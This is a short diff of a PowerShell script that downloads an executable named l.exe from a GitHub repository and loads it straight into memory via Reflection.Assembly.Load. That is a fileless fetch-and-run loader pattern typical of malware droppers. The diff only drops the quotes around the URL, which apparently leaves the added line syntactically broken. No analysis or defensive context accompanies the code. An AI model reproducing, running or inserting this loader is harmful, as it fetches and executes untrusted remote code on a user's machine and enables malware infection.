@@ -1,4 +1,4 @@
-$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe"
+$link = https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe
 $webClient = New-Object System.Net.WebClient
 $bytes = $webClient.DownloadData($link)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
